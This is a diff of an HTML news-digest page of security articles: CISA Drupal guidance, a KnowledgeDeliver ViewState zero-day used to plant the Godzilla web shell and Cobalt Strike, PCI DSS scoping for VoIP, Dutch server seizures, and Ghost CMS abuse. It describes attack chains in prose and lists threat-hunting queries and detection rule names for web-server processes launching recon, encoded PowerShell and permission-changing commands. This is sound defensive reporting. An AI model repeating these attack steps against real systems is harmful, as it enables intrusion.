+Although BOD 22-01 applies only to U.S. federal agencies, CISA advised all defenders, including those in the private sector, to apply CVE-2026-9082 patches as soon as possible to secure their organizations' devices.
+"This type of vulnerability is a frequent attack vector for malicious cyber actors and poses significant risks to the federal enterprise [..] Although BOD 22-01 only applies to FCEB agencies, CISA strongly urges all organizations to reduce their exposure to cyberattacks by prioritizing timely remediation of KEV Catalog vulnerabilities as part of their vulnerability management practice," the cybersecurity agency warned.
+"Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable."
+Over the last several years, CISA has [flagged 5 Drupal vulnerabilities](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?f%5B0%5D=vendor_project%3A807) that have been exploited in the wild, two of which have also been abused in ransomware attacks.
+[The Validation Gap: Automated Pentesting Answers One Question. You Need Six.](https://hubs.li/Q048zztN0)
+Automated pentesting tools deliver real value, but they were built to answer one question: can an attacker move through the network? They were not built to test whether your controls block threats, your detection rules fire, or your cloud configs hold.
+This guide covers the 6 surfaces you actually need to validate.
+[Download Now](https://hubs.li/Q048zztN0)
+Post a Comment Community Rules
+You need to login in order to post a comment
+Not a member yet? Register Now</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-3" class="article-body">
+            <h2 class="article-title">KnowledgeDeliver LMS Flaw Exploited to Deploy Godzilla and Cobalt Strike</h2>
+            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/05/knowledgedeliver-lms-flaw-exploited-to.html" target="_blank">Original Link</a></p>
+            <div class="content-text">A now-patched high-severity security flaw affecting Digital Knowledge [KnowledgeDeliver](https://www.digital-knowledge.co.jp/product/kd/), a Learning Management System (LMS) popular in Japan, was exploited as a zero-day to deliver the Godzilla web shell and ultimately facilitate the deployment of Cobalt Strike Beacon.
+The vulnerability, tracked as [CVE-2026-5426](https://nvd.nist.gov/vuln/detail/CVE-2026-5426) (CVSS score: 7.5), stems from the use of hard-coded ASP.NET machine keys, leading to unauthenticated remote code execution via a ViewState deserialization attack. The abuse of publicly disclosed ASP.NET machine keys by threat actors was [first documented](https://thehackernews.com/2025/02/microsoft-identifies-3000-publicly.html) by Microsoft in February 2025.
+"An unknown threat actor leveraged this access to inject malicious code into the LMS platform, with the goal of infecting users visiting the site," Google Mandiant and Google Threat Intelligence Group (GTIG) [said](https://cloud.google.com/blog/topics/threat-intelligence/knowledgedeliver-viewstate-deserialization-vulnerability/).
+The security flaw impacted Digital Knowledge KnowledgeDeliver deployments prior to February 24, 2026. It's worth noting that similar vulnerabilities in [Sitecore Experience Manager](https://thehackernews.com/2025/09/cisa-orders-immediate-patch-of-critical.html) (XM) and [Gladinet CentreStack and TrioFox](https://thehackernews.com/2025/10/from-lfi-to-rce-active-exploitation.html) have also been exploited by threat actors.
+The problem is rooted in the fact that KnowledgeDeliver installations relied on a standardized web.config file provided by the vendor that contained hard-coded machineKey values used by the ASP.NET framework to encrypt and sign data, including ViewState payloads.
+As a result, a threat actor who manages to obtain the keys from one deployment could leverage them to compromise other internet-facing KnowledgeDeliver instances.
+"The ASP.NET ViewState persists page state across postbacks," Google said. "When the machineKey is known, a threat actor can craft a malicious ViewState payload. By sending this payload in an HTTP request (via the __VIEWSTATE parameter), the threat actor can make the server deserialize it."
+In the activity observed in connection with CVE-2026-5426, attackers have been found to deploy the Godzilla (aka BLUEBEAM) web shell, granting them the ability to run commands or drop additional payloads.
+Among the commands executed were instructions to escalate their control over the web server's file system by granting "Everyone" complete access to the web application directory. Subsequently, the threat actor tampered with an application JavaScript file to include code that displayed a fake security alert, urging users to install a "security authentication plugin."
+In tandem, the unauthorized modifications made it possible to stealthily load a malicious script hosted on an attacker-controlled domain. The script, in turn, convinced users to download a fake installer, ultimately infecting the machines with Cobalt Strike Beacon.
+"The payload was encrypted using a key that used the name of the compromised organization, which indicated that the threat actor prepared this payload specifically for the targeted organization," Google said.
+"The exploitation of KnowledgeDeliver highlights the severe risks of using shared secrets in deployment templates. A single leaked key can compromise an entire ecosystem of installations. By implementing unique secrets and robust endpoint monitoring, organizations can defend against these deserialization attacks."
+[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-4" class="article-body">
+            <h2 class="article-title">PCI DSS, Telephone Payments, and the Problems With VoIP</h2>
+            <p class="source-link">Source: TrustedSec | <a href="https://trustedsec.com/blog/pci-dss-telephone-payments-and-the-problems-with-voip" target="_blank">Original Link</a></p>
+            <div class="content-text">PCI DSS, Telephone Payments, and the Problems With VoIP
+Merchants have been accepting payment cards over telephones for a long time, but changing interpretations of VoIP guidance have led to confusion about which PCI DSS requirements apply to telephone-based payment channels. Merchants that have used SAQ C-VT or P2PE to reduce the number of PCI DSS requirements that apply to telephone payment channels are discovering that they cannot use and benefit from these SAQs if they collect payments over VoIP.
+Merchants typically encounter this issue when additional requirements appear in the annual PCI DSS compliance attestation web form provided by their processor after answering 'Yes' to a question about the use of VoIP. Merchants may also encounter this issue when their transaction volumes increase to the point that they can no longer self-assess and are informed by a QSA that they have been incorrectly applying the PCI DSS SAQ C-VT or P2PE to their telephone payment channel.
+This post explains who is affected by the VoIP guidance interpretation, where this interpretation comes from, and how merchants can reduce the number of PCI DSS requirements applicable to their telephone-based payment channels and be prepared for their next assessment (with some QSA gripes along the way).
+TrustedSec has long worked to move its clients into compliance with the PCI SSC guidance around how telephone payments via VoIP must be scoped and assessed and can assist other merchants struggling with this issue. If you need assistance with this, [get in touch with us!](https://trustedsec.com/contact)
+Who This Applies To
+This issue applies to merchants using eligibility for PCI SAQ C-VT or P2PE to reduce the number of PCI DSS requirements applicable to a telephone-based payment channel when payment card account data is received over VoIP. This includes merchants that complete a ROC but use eligibility for SAQ C-VT or P2PE to determine the applicable controls within the ROC, as per [PCI SSC FAQ 1331](https://www.pcisecuritystandards.org/faq/articles/Frequently_Asked_Question/can-saq-eligibility-criteria-be-used-as-a-guide-for-determining-applicability-of-pci-dss-requirements-for-merchant-assessments-documented-in-a-report-on-compliance/).
+Merchants that attest to PCI DSS compliance via a guided questionnaire on their processor’s website may not be aware of which SAQ they are effectively using. Behind the scenes, the first few questions in these forms are usually used to determine which SAQ applies to the merchant, and the remaining questions are based on the requirements in applicable SAQ.
+The following list can be used by merchants to determine which SAQ their processor has likely been applying to them and how many requirements to expect compared to the full set of 236 PCI DSS merchant requirements (not including the rarely used appendices). Note that all SAQ types are included in this list to help merchants identify which may be applied, but only SAQs C-VT and P2PE are subject to the VoIP issue described in this post.
+SAQ | Requirements | Use Case |
+|---|---|---|
+A | 6 requirements directly applicable to telephone payment channels 8 additional requirements if paper records contain account data 16 additional requirements not applicable to telephone payments | All processing of payment card account data via telephone is entirely outsourced to a PCI DSS compliant third-party service provider (TPSP) |
+A-EP | 138 total requirements | Never applicable to telephone payments |
+B | 15 requirements directly applicable to telephone payment channels 12 additional requirements if paper records contain account data | Keyed into a dial-out terminal device connecting directly to the payment processor via a phone line |
+B-IP | 37 requirements directly applicable to telephone payment channels 11 additional requirements if paper records contain account data | Keyed into a PCI-listed approved PTS payment terminal device connecting directly to the payment processor via an IP network (usually the Internet) |
+C | 108 requirements directly applicable to telephone payment channels 4 additional requirements if the payment application is bespoke or custom software 12 additional requirements if paper records contain account data | Keyed into a payment application operated by the merchant |
+C-VT | 44 requirements directly applicable to telephone payment channels 10 additional requirements if paper records contain account data | Keyed into a web-based virtual payment terminal provided and hosted by a PCI DSS compliant TPSP |
+D Merchant | 236 total requirements | Applicable when no other SAQ applies |
+P2PE | 15 requirements directly applicable to telephone payment channels 6 additional requirements if paper records contain account data | Keyed into a validated PCI-listed P2PE payment terminal solution |
+SPoC | 22 total requirements | Never applicable to telephone payments |
+The Interpretation
+VoIP in PCI DSS
+PCI SSC guidance states that the PCI DSS requirements apply to VoIP traffic from a cardholder to a merchant that contains payment card account data just as they would to any other network traffic that contains account data. This means:
+- VoIP traffic is in scope for PCI DSS requirements as soon as it crosses the network boundary into the merchant environment.
+- The VoIP telephone and/or workstation running a VoIP softphone is in scope.
+The sources of this guidance are as follows:
+[PCI SSC FAQ 1153](https://www.pcisecuritystandards.org/faq/articles/Frequently_Asked_Question/is-voip-in-scope-for-pci-dss/) concerns how PCI DSS applies to VoIP. The part of this FAQ most relevant to this issue is:
+“While PCI DSS does not explicitly reference the use of VoIP, VoIP traffic that contains payment card account data is in scope for applicable PCI DSS controls, just as other IP network traffic containing payment card account data would be.” |
+The FAQ also contains this relevant paragraph that tells us a transmission of account data from a cardholder to a merchant is in scope once it enters the merchant’s environment:
+“External transmissions to/from cardholders: Where VoIP is used for transmissions of payment card account data between a cardholder and an entity, the entity's systems and networks used for those transmissions are in scope. […] This applies regardless of whether the transmissions are initiated by the entity or the cardholder.” | ||
+This topic is also covered in more detail with supporting diagrams throughout the [Information Supplement on Protecting Telephone-Based Payment Card Data](https://docs-prv.pcisecuritystandards.org/Guidance%20Document/Telephone-Based%20Payments/Protecting_Telephone_Based_Payment_Card_Data_v3-0_nov_2018.pdf).
+VoIP Effect on SAQ Eligibility
+Each SAQ has eligibility criteria that determine under which scenarios a merchant may benefit from the reduced number of applicable requirements in that SAQ. The eligibility criteria are usually listed on page iii of the SAQ templates (or page iv in SAQ C) available from the [PCI SSC Document Library](https://www.pcisecuritystandards.org/document_library/).
+There are lines in both the SAQ C-VT and P2PE eligibility criteria that combine to prohibit the use of these SAQs when account data is received via VoIP:
+- Both the SAQ C-VT and P2PE eligibility criteria define the only authorized electronic channel for account data handled under each of these SAQs:
+- SAQ C-VT: “The only payment processing is via a virtual payment terminal accessed by an Internet-connected web browser”
+- SAQ P2PE: “All payment processing is via a validated PCI-listed P2PE solution”
+- Both SAQs then go on to prohibit receiving account data electronically via other methods:
+- SAQ C-VT: “The merchant does not otherwise receive, transmit, or store account data electronically through any channels (for example, via an internal network or the Internet)”
+- SAQ P2PE: “The merchant does not otherwise receive, transmit, or store account data electronically”
+This text is clear: There is only one authorized channel for electronic account data under each of these SAQs, and any other handling of electronic account data renders a payment channel ineligible for these SAQs. VoIP is neither “a virtual payment terminal accessed by an Internet-connected web browser” nor “a validated PCI-listed P2PE solution” so the receipt of electronic account data via VoIP violates the eligibility criteria in both of these SAQs. Merchants receiving payments via VoIP are therefore ineligible to benefit from the reduced set of requirements in these specific SAQs and must use a different SAQ.
+This is true regardless of whether:
+- The VoIP traffic is destined for a hardware phone sitting on a desk or a softphone application installed on a workstation or mobile device:
+- The merchant is receiving VoIP traffic containing electronic account data in violation of the eligibility criteria in both scenarios.
+- Calls are not recorded or recording is paused when account data is read:
+- The merchant is receiving VoIP traffic containing electronic account data in violation of the eligibility criteria even if the account data is not stored.
+- VoIP infrastructure is segmented from the rest of the network:
+- Segmentation may help keep the rest of the merchant’s network out of scope, but the VoIP infrastructure is still receiving electronic account data in violation of the eligibility criteria.
+- VoIP traffic is encrypted:
+- Encryption can be used to get account data out of scope in certain circumstances but the paragraph on Encrypted Cardholder Data and Impact on PCI DSS Scope in section 4 of PCI DSS tells us that “encrypted cardholder data that is present in the same environment as the decryption key” is in scope. Something in the merchant’s environment (often the VoIP telephone or softphone) must have the decryption key if merchant personnel are able to hear the contents of a call, so the encrypted VoIP traffic is in scope when it is received and violates the eligibility criteria.
+Options to Maintain Compliance
+The good news is that the use of VoIP does not automatically make a merchant non-compliant; it just means the merchant cannot use SAQ C-VT or P2PE (the use of shorter SAQs is always optional). A merchant would only be non-compliant if it does not implement the other PCI DSS controls that apply due to ineligibility for SAQ C-VT or P2PE.
+A merchant that finds itself receiving account data via VoIP in what it thought was an SAQ C-VT or P2PE eligible environment has a few options listed here, but this information is also described in more detail below:
+- Stop taking telephone payments.
+- Eliminates PCI DSS applicability to VoIP by eliminating the payment channel
+- Switch from VoIP back to POTS lines and keep using SAQ C-VT or P2PE.
+- Minimizes changes to existing processes, if POTS lines are still available
+- Outsource telephone payment acceptance to achieve eligibility for SAQ A.
+- Minimizes compliance obligations by transferring them to a third party
+- Change how telephone payments are processed to be eligible for another short SAQ that does not have this issue (B, B-IP, or C).
+- SAQ B-IP is the recommended option for merchants using P2PE solutions when none of the options above are viable.
+- Merchants with an existing payment application may consider processing telephone transactions via their payment application to achieve eligibility for SAQ C.
+- Fall back to the default SAQ D Merchant and apply all PCI DSS requirements.
+- May be the only option for merchants that want to keep using a virtual terminal solution and cannot install POTS lines
+Stop Taking Telephone Payments
+Some of the merchants TrustedSec has worked with have determined that telephone payments represent such a tiny fraction of their payments that it’s not worth keeping them available as a payment channel.
+Some merchants have call center personnel email or text a web payment link to customers instead of taking payment details via telephone. The VoIP infrastructure will be out of scope for PCI DSS in this scenario, as it no longer accepts account data. The website that accepts payments will be in scope, but this is often a merchant’s own payment site that is already in scope for PCI DSS as part of another payment channel, or a payment page outsourced to a PCI DSS compliant third party that is eligible for SAQ A from the merchant perspective.
+Some merchants integrate web payment systems with call center software so that call center personnel can see when payments have been completed online without bringing the call center itself into scope for PCI DSS.
+Switch to POTS Lines
+SAQ C-VT was written in the era of POTS lines, and using a regular old telephone from that era would maintain eligibility (POTS lines would also maintain eligibility for SAQ P2PE). Some of TrustedSec’s clients have reinstalled POTS lines for their call centers, but it is not very popular as POTS lines are as hard to come by these days as imprint machines.
+TrustedSec has also heard of some merchants using mobile phones to accept payments instead of VoIP phones, but this approach strays into a grey area within PCI DSS that warrants further discussion in another post: Modern smartphones that connect and receive voice traffic via IP-based protocols are just as sophisticated as desktop and laptop computers, and are increasingly susceptible to malicious attacks. It’s hard to make a case that it would be acceptable to use a smartphone, which is essentially an IP-connected softphone running on a very small workstation, when it is not acceptable to use an IP-connected softphone running on a normal sized workstation.
+Outsource Telephone Payments
+Many merchants have had success outsourcing the parts of the telephone call that require handling payment card account data. This results in eligibility for SAQ A which, as applied in this scenario, is the shortest of the SAQs.
+There are a few different ways this can be implemented, such as:
+- On one extreme, the merchant can completely outsource the entire call process to third-party personnel.
+- Another popular option is to use merchant personnel to receive calls but transfer the payment stage of the call to an IVR solution that steps in to receive and process the account data on a third-party system.
+Care must be taken when designing an IVR solution to keep the merchant systems from falling in scope. In some solutions the call continues to be routed through the merchant environment to the third-party IVR solution after the payment process starts. In this scenario the merchant environment would remain in scope (and ineligible for SAQ A, C-VT, and P2PE) because the VoIP traffic with account data is still moving through the merchant environment as shown in section 6.4.1.2 of the PCI [Information Supplement on Protecting Telephone-Based Payment Card Data](https://docs-prv.pcisecuritystandards.org/Guidance%20Document/Telephone-Based%20Payments/Protecting_Telephone_Based_Payment_Card_Data_v3-0_nov_2018.pdf). The call routing should occur outside the merchant environment to keep it out of scope and achieve eligibility for SAQ A as shown in section 6.4.1.1 of that document.
+Regardless of the method used, the merchant must outsource to a PCI DSS compliant TPSP. This is explicitly required in SAQ A.
+Only six requirements in SAQ A usually apply to an outsourced telephone payment process with no paper, making for a very easy compliance program:
+- Requirements 12.8.1-12.8.5 related to managing the PCI DSS compliance of the service provider
+- Requirement 12.10.1 for an Incident Response plan
+Change How Telephone Payments are Processed
+The eligibility criteria for SAQs B, B-IP, and C all prohibit electronic storage of account data, and SAQ B-IP prohibits transmission of account data from anything other than the approved payment terminal device, but none of them prohibit receiving electronic account data. Effectively this means a payment process receiving account data via VoIP could be eligible for these SAQs even though it would be ineligible for SAQs C-VT and P2PE. Yes, dear reader, this makes absolutely no sense, but as a QSA we conduct our assessments according to the text of the official documents.
+SAQ B
+SAQ B is only for payments keyed into dial-out terminals using POTS lines. These terminals would need to replace the use of a virtual terminal under SAQ C-VT or the P2PE solution terminals under SAQ P2PE.
+There is some advantage to replacing a virtual terminal with dial-out terminals as SAQ B for dial-out contains less requirements than SAQ C-VT for virtual terminals.
+This advantage goes away when replacing P2PE terminals, as SAQs P2PE and B have roughly the same number of applicable requirements. It’s likely cheaper and easier for merchants to use POTS lines to replace their VoIP phones and achieve eligibility for SAQ P2PE rather than buy new dial-out terminals to replace a P2PE solution.
+SAQ B-IP
+SAQ B-IP is for payments keyed into IP-connected payment terminal devices. A P2PE solution could be made eligible for SAQ B-IP without replacing any hardware. Merchants using a virtual terminal under SAQ C-VT would need to buy and use hardware terminals as part of a P2PE validated solution.
+The main challenge when using SAQ B-IP is that the payment terminal hardware must be isolated from all other merchant systems as per the eligibility criteria:
+“The standalone, IP-connected PTS POI devices are not connected to any other systems within the merchant environment (this can be achieved via network segmentation to isolate PTS POI devices from other systems)” | ||
+This should be considered as part of the design when deploying new hardware terminals to replace an SAQ C-VT virtual terminal, but is also a concern when replacing or reusing existing P2PE terminal deployments. One of the advantages of a P2PE solution is that the terminals often do not need to be isolated, but a merchant ineligible for SAQ P2PE due to the use of VoIP must isolate the terminals to become eligible for SAQ B-IP.
+SAQ C
+SAQ C is for payments keyed into a payment application. The application would need to replace the use of a virtual terminal under SAQ C-VT or the standalone P2PE solution terminals under SAQ P2PE.
+Deploying a payment application is a significant effort, and SAQ C contains many more requirements than the other short SAQs discussed here. This solution is only recommended for merchants that already have an existing payment application eligible for SAQ C that they can begin using for telephone payments.
+Transactions can be keyed directly into the payment application, effectively replacing the virtual terminal website with the payment application itself. Merchants that previously used SAQ P2PE may also connect their hardware terminals to the payment application as is typical of a POS system.
+Some merchants try to use their own eCommerce as the payment application under SAQ C, but this raises some potential issues with the SAQ C eligibility criteria which state that the payment application must be on the same devices or LAN, and that the payment application is isolated from all other merchant systems:
+- “The merchant has a payment application system and an Internet connection on the same device and/or same local area network (LAN)”
+- “The payment application system is not connected to any other systems within the merchant environment (this can be achieved via network segmentation to isolate payment application system/Internet device from all other systems)”
+Modern eCommerce sites are often hosted by third parties, which would violate the first of these eligibility criteria, and eCommerce sites often connect to various other merchant systems, which would violate the second of these eligibility criteria. Determining whether an eCommerce site is eligible for SAQ C would be on a case-by-case basis depending on how the eCommerce site is deployed and configured.
+Apply All PCI DSS Requirements
+If none of the options above are feasible, the only remaining option is to apply all of the PCI DSS requirements from SAQ D Merchant to the telephone payment process. This is generally not recommended unless absolutely necessary due to the number of requirements that will be applicable and the amount of effort required to document compliance.
+There will likely be many requirements from SAQ D that are not applicable to a telephone payment process because the merchant is not performing an activity that the requirement applies to. The merchant will need to individually justify why these requirements are not applicable when completing an SAQ (a form for this is in Appendix C of the SAQ template) or ROC (the QSA or ISA will handle documentation). For example, a merchant can justify the non-applicability of Requirement 3 (Protect Stored Account Data) if account data is never stored.
+The following is a rough outline of PCI DSS requirements that usually do not apply to simple telephone payment channels, assuming the merchant:
+- Is using a virtual terminal
+- Has no wireless in or connected to the CDE
+- Is not storing account data in any format (e.g., call recordings or paper slips)
+Justification | Requirements |
+|---|---|
+No stored account data | 1.4.4, 3.1.1-3.7.9, 7.2.6, 9.4.1-9.4.7, 10.2.1.1 |
+No wireless environments connected to the CDE | 2.3.1-2.3.2, 4.2.1.2 |
+Not an Issuer | 3.3.3 |
+Not a Service Provider | 3.6.1.1, 3.7.9, 8.3.10-8.3.10.1, 10.7.1, 12.4.1-12.4.2.1, 12.5.2.1-12.5.3, 12.9.1-12.9.2, A1.1.1-A1.2.3 |
+End-user messaging technologies not used to send PAN | 4.2.2 |
+No bespoke or custom software | 6.2.1-6.2.4, 6.3.2 |
+Superseded by another control as of March 31, 2025 | 6.4.1, 8.3.10, 10.7.1 |
+No public-facing web applications or payment pages | 6.4.1-6.4.3, 11.6.1 |
+No sensitive areas within the CDE | 9.2.1.1, 9.3.1.1 |
+No POI devices | 9.5.1-9.5.1.3 |
+Not using SSL/Early TLS | A2.1.1-A2.1.3 |
+Not a Designated Entity | A3.1.1-A3.5.1 |
+This list contains 103 sub requirements from PCI DSS (including the appendices and some other requirements not in SAQ D Merchant), which leaves 177 potentially applicable requirements. This is not an official list, and merchants will need to individually confirm the non-applicability of these requirements to their environment.
+Some of the remaining applicable requirements may be handled by the provider of the virtual terminal solution, e.g., they may take responsibility for much of requirement 4 related to the encryption of transmitted account data. Merchants should contact their service provider for information on the sharing of PCI DSS responsibilities as per requirements 12.8.5 and 12.9.2 and adjust the list of applicable controls accordingly.
+QSA Gripes and A Way Forward
+As a QSA, writing this post brings me no joy; it is instead a task made necessary by collisions between various documents released by PCI SSC over the span of more than a decade that has led to nonsensical conclusions and confusion (made worse by processors that only relatively recently began enforcing this interpretation). As a QSA, I am not free to rewrite PCI DSS the way I see fit and can only assess the requirements in accordance with the text of the standard and guidance provided to me by PCI SSC. This post was an attempt to help our clients (and maybe other QSAs and ISAs struggling with the same issue) find a path through the nonsense.
+I believe the PCI SSC guidance to treat VoIP traffic the same as any other network traffic makes sense (even though it may not have when the [VoIP FAQ](https://www.pcisecuritystandards.org/faq/articles/Frequently_Asked_Question/is-voip-in-scope-for-pci-dss/) was published in 2012). Advances in voice recognition in the years since that FAQ was released make it much easier for an attacker to automatically extract a list of card numbers from intercepted VoIP traffic. If this wasn’t a real threat then, it definitely is now.
+In that spirit, I will admit that it frustrates me that VoIP is treated differently depending on what the merchant keys account data into after sounds arrive at their ears. If the concern is that an attacker may intercept the VoIP audio, this concern should apply equally to any payment channel with VoIP regardless of what the data is keyed into. This would logically leave two options to resolve this conundrum and create consistency (of which I prefer the first option):
+- Adjust the shorter SAQs discussed here so that merchants using VoIP are eligible for all of them while adding requirements that only apply to VoIP, just like various SAQs already contain requirements that only apply to paper records.
+- Make merchants using VoIP ineligible for any of the shorter SAQs if PCI SSC deems only the full set of PCI DSS controls sufficient to address VoIP risks.
+Adding to this, it frustrates me that the current situation with the interaction between SAQ eligibility criteria and VoIP guidance leaves SAQ C-VT nearly useless in a world that has almost completely transitioned to VoIP. I do not think that was the intent of PCI SSC, but I cannot ignore the plain text of the eligibility criteria and VoIP guidance to allow merchants to use C-VT because I think I can read minds. This is unfortunate because SAQ C-VT used to be a great tool in the heyday of POTS lines.
+An update to the telephony guidance document referenced above is also on this QSA’s wish list. It’s easy to say VoIP traffic should be treated “just as other IP network traffic containing payment card account data would be”, but in practice VoIP is often poorly understood, even by the people managing it (and, I hate to say, some QSAs). It is still often seen as something 'other' than regular network traffic, like the old POTS system was somehow teleported into Ethernet, rather than just another IP-based network protocol like HTTPS. The rise of VoIP softphones running on workstations in applications that don’t even feel like phones (e.g., Microsoft Teams) and cloud-based VoIP solutions muddy these waters further for people who don’t understand how VoIP works.
+I would appreciate something official from PCI SSC to clear this up further because I find myself explaining all too often why a merchant is not (and never should have been) eligible for SAQ C-VT, why the applicable number of requirements seemingly tripled overnight, why not recording calls doesn’t take VoIP out of scope, why encryption doesn’t take VoIP out of scope, why hardware VoIP phones and any device running a softphone are part of the CDE, and why anything on the same network as VoIP phones and devices with softphones is dragged into the PCI DSS scope (but this would all go away if you reinstalled POTS lines).
+Here’s looking forward to the public comment period for the next revision of PCI DSS—this QSA will certainly have a few things to say.</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-5" class="article-body">
             <h2 class="article-title">Exploitation of KnowledgeDeliver via ViewState Deserialization Vulnerability</h2>
             <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/knowledgedeliver-viewstate-deserialization-vulnerability/" target="_blank">Original Link</a></p>
             <div class="content-text">Exploitation of KnowledgeDeliver via ViewState Deserialization Vulnerability
@@ -159,6 +534,7 @@ Investigation: Hunt for this activity, and conduct a thorough investigation if a
 Outlook and Implications
 The exploitation of KnowledgeDeliver highlights the severe risks of using shared secrets in deployment templates. A single leaked key can compromise an entire ecosystem of installations. By implementing unique secrets and robust endpoint monitoring, organizations can defend against these deserialization attacks.
 Indicators of Compromise (IOCs)
+To assist the wider community in hunting and identifying activity outlined in this blog post, we have included indicators of compromise (IOCs) in a [free GTI Collection for registered users](https://www.virustotal.com/gui/collection/913190c02565264d6f8cda8af95926e28fa584188da0f33bcc585e57f92271ba).
 Google Security Operations (SecOps)
 The following [SecOps](https://cloud.google.com/security/products/security-operations) searches can be used to hunt for this activity.
 (metadata.log_type = "WINEVTLOG" or metadata.log_type = "WINEVTLOG_XML")
@@ -175,7 +551,7 @@ W3wp Launching Cmd With Recon Commands
 -
 W3wp Launching Encoded Powershell
 -
-W3wp Launching Icalcls
+W3wp Launching Icacls
 -
 Web Server Process Launching Whoami
 -
@@ -190,7 +566,7 @@ Mandiant would like to extend our thanks to the Digital Knowledge team for their
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-2" class="article-body">
+        <div id="art-6" class="article-body">
             <h2 class="article-title">Netherlands Seizes 800 Servers, Arrests 2 for Aiding Cyberattacks</h2>
             <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/05/netherlands-seizes-800-servers-arrests-2-for-aiding-cyberattacks/" target="_blank">Original Link</a></p>
             <div class="content-text">Authorities in the Netherlands have arrested the co-owners of two related Internet hosting companies for operating IT infrastructure used by Russia to carry out cyberattacks, influence operations and disinformation campaigns inside the European Union. The two men were the focus of a 2025 KrebsOnSecurity story about how their hosting companies had assumed control over the technical infrastructure of Stark Industries Solutions, an Internet service provider sanctioned last year by the EU as a frequent staging ground for cyber mischief from Russia’s intelligence agencies.
@@ -219,36 +595,23 @@ Not exactly related to the article contents, but thank you for naming the FIOD.
 I’ve been having a problem with a large Dutch tech company stealing money from me in the form of uncancellable subscriptions. Company retaliated against me after I disclosed a PII leak to the DPA, DPA leaked my confidential tipoff to the company, and on the same day as the PII leak was fixed, the company banned my account on their service. As of writing the company is ignoring all attempts at contact for nearly 365 days and keep a subscription ongoing on the account with no way to cancel it. Payment processors don’t care, Stripe only responds with copy & paste text along the lines of “we’ll definitely investigate!” but naturally are not considering the company is heavily featured on stripe.com.
 You’d think the DPA would jump on the first chance to make an example out of a Big Tech company and fine them millions of euros (millions of users affected, no public statement, no users informed), but who watches the watchmen?
 So today I’ve decided to reach out to the FIOD about this massive financial fraud. I’m not the only victim, as banned accounts are unable to cancel / manage subscriptions. Maybe it’ll go somewhere, maybe not. So far my experience with Dutch bureaucrats has been extremely negative.
+Dutch ACM (consumer protection agency) is a joke — I faced direct retaliation after the DPA forwarded my confidential tip to them, and now they’re simply going “Please try out of court settlement, we are not a mediator in your situation, we just use your information as a guide to determine who to investigate”, as if they didn’t directly cause the retaliation…
+Bonus: they’re only communicating to me via a noreply, despite previously communicating just fine via email, forcing me to fill out a complex Dutch webform each time I want to send a message hahahahahaha
+Go to your bank and tell them you lost your card
 Too bad America doesn’t seem to be able to after these “bad actots” who spread disinformation and write lies to react choas in America. Their is so much fake information being posted to create the situation in America to be worst than it is already. Help Denmark!!!!
 THE network and server infrastructure is still up and running
-UPAdlinian dogs.</div>
+UPAdlinian dogs.
+Dont Be Frreaking out Physical Servers are one Thing, as many servers as you want on virtual IP’s is another. That 800 number could come from 2 servers so simmer down and ask for more facts or wait until after the trial .
+“That 800 number could come from 2 servers” isn’t really the or ‘a’ point. 800 isn’t a big number in virtual space either.
+“simmer down” like reporting given information that you do have is somehow not the best option? Who is simmering?
+Let Brian cook, go have a schvitz. We’re all waiting for more facts and the trial, that’s linear time doing that thang.
+Re: the accompanying photo, aren’t the ‘good guys’ supposed to wear white hats?
+Here comes the style police.</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-3" class="article-body">
-            <h2 class="article-title">Ghost CMS CVE-2026-26980 Exploited to Hijack 700+ Sites for ClickFix Attacks</h2>
-            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/05/ghost-cms-cve-2026-26980-exploited-to.html" target="_blank">Original Link</a></p>
-            <div class="content-text">Threat actors are exploiting a recently disclosed critical security flaw in Ghost CMS to inject malicious JavaScript code with an aim to fuel [ClickFix](https://thehackernews.com/2025/08/clickfix-malware-campaign-exploits.html) attacks.
-According to QiAnXin XLab, the activity involves the exploitation of [CVE-2026-26980](https://github.com/TryGhost/Ghost/security/advisories/GHSA-w52v-v783-gw97) (CVSS score: 9.4), an [SQL injection vulnerability](https://www.sentinelone.com/vulnerability-database/cve-2026-26980/) in Ghost's Content API that could allow an unauthenticated attacker to read arbitrary data from the database. The security flaw was addressed in February 2026 in version 6.19.1. The vulnerability was [discovered](https://thehackernews.com/2026/05/claude-mythos-ai-finds-10000-high.html) by Anthropic using Claude.
-What makes the vulnerability severe is that it allows an attacker to gain access to a site's [admin API key](https://docs.ghost.org/admin-api) without permission, granting them the ability to poison the site by injecting malicious code. The admin API key can be used to invoke the admin API and can directly modify articles published on the content management system.
-The threat actor leveraged the security flaw to "obtain the target site's Admin API Key without authorization, and then used the Ghost Admin API to tamper with articles in bulk, injecting malicious JavaScript loaders at the bottom of the pages to assist fake CAPTCHA attacks," XLab [said](https://blog.xlab.qianxin.com/ghost-cms-mass-compromised-via-cve-2026-26980-now-fueling-clickfix-attacks/).
-The activity has been described by the Chinese security vendor as a "large-scale poisoning" campaign weaponizing the Ghost CMS flaw. At least two different threat clusters are assessed to be behind the campaign, in some cases implanting certain sites with malicious code within a single day. It was first detected on May 7, 2026.
-In all, the campaign has compromised more than 700 websites, spanning [universities](https://www.pcrisk.com/removal-guides/35203-harvardedu-clickfix-malware), blockchain, artificial intelligence, software-as-a-service (SaaS), security research, media, and financial technology sectors. The fact legitimate websites have been breached could further increase the success rate of the ClickFix attacks, XLab said.
